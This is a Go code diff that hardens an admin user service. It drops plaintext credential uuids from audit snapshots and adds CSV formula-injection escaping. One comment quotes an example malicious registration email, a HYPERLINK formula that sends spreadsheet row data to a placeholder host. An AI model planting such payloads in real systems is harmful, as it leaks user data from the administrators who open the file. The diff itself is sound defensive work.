@@ -592,7 +592,13 @@ func updateAdminUserTx(ctx context.Context, q adminUserPatchQuerier, arg dbgen.U
 		TargetID:   strconv.FormatInt(row.ID, 10),
 		Reason:     reason,
 		Before: map[string]any{
-			"uuid":                 uuidText(row.BeforeUuid),
+			// 🔴 **不存明文 uuid。** users.uuid 是节点侧的连接凭据（data-model §「节点侧连接凭据」）。
+			//    本文件另外两处已经明确拒绝把它交出去：AdminUser 响应体不含它、D14 导出 CSV 不含它
+			//    （「一份泄漏的导出 CSV 若含 uuid，等于把全部用户的账号一起送出去」）。
+			//    审计快照是第三条路，而且是最松的一条：audit_logs 是 append-only、没有删除入口、
+			//    会进 log sink，而 GET /admin/audit 既无角色闸也无权限位、原样透传 JSON。
+			//    审计要回答的是「uuid 变了没有」，那个问题用一个布尔值就能回答，不需要凭据本身。
+			"uuid_changed":         row.BeforeUuid != row.AfterUuid,
 			"group_id":             row.BeforeGroupID,
 			"expired_at":           tptr(row.BeforeExpiredAt),
 			"device_limit":         row.BeforeDeviceLimit,
@@ -601,7 +607,7 @@ func updateAdminUserTx(ctx context.Context, q adminUserPatchQuerier, arg dbgen.U
 			"transfer_enable":      row.BeforeTransferEnable,
 		},
 		After: map[string]any{
-			"uuid":                 uuidText(row.AfterUuid),
+			"uuid_changed":         row.BeforeUuid != row.AfterUuid,
 			"group_id":             row.AfterGroupID,
 			"expired_at":           tptr(row.AfterExpiredAt),
 			"device_limit":         row.AfterDeviceLimit,
@@ -1537,6 +1543,25 @@ var adminExportCSVHeader = []string{
 //
 // ⚠️ **不导出 uuid**（ExportAdminUsersRows 也没选它）：uuid 是节点侧的连接凭据，
 // 一份泄漏的导出 CSV 若含 uuid，等于把全部用户的账号一起送出去。
+// csvCell 挡住 Excel / LibreOffice 的公式注入。
+//
+// 🔴 这份导出**带 BOM 且明确是给 Excel 打开的**（见上面的注释），而 email 与套餐名
+//
+//	是用户可控的自由文本。一个注册邮箱形如 `=HYPERLINK("http://x/?"&A1,"点我")@x.com`
+//	在 Excel 里不是字符串而是**公式**：打开文件的管理员点一下就把同行数据带出去了。
+//	CSV 本身没有转义这一层（引号只解决分隔符，不解决「首字符是 =」），
+//	所以必须在写入前给危险首字符加一个前导单引号 —— 那是 Excel 认的「强制文本」标记。
+func csvCell(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
+}
+
 func buildUsersCSV(rows []dbgen.ExportAdminUsersRowsRow) ([]byte, error) {
 	var buf strings.Builder
 	buf.WriteString("\ufeff")
@@ -1547,12 +1572,12 @@ func buildUsersCSV(rows []dbgen.ExportAdminUsersRowsRow) ([]byte, error) {
 	for _, r := range rows {
 		rec := []string{
 			strconv.FormatInt(r.ID, 10),
-			r.Email,
+			csvCell(r.Email),
 			strconv.FormatBool(r.Banned),
 			csvTime(r.CreatedAt),
 			csvTime(r.LastLoginAt),
 			csvInt64Ptr(r.PlanID),
-			derefOr(r.PlanName, ""),
+			csvCell(derefOr(r.PlanName, "")),
 			strconv.FormatInt(r.GroupID, 10),
 			csvTime(r.ExpiredAt),
 			csvInt32Ptr(r.DeviceLimit),
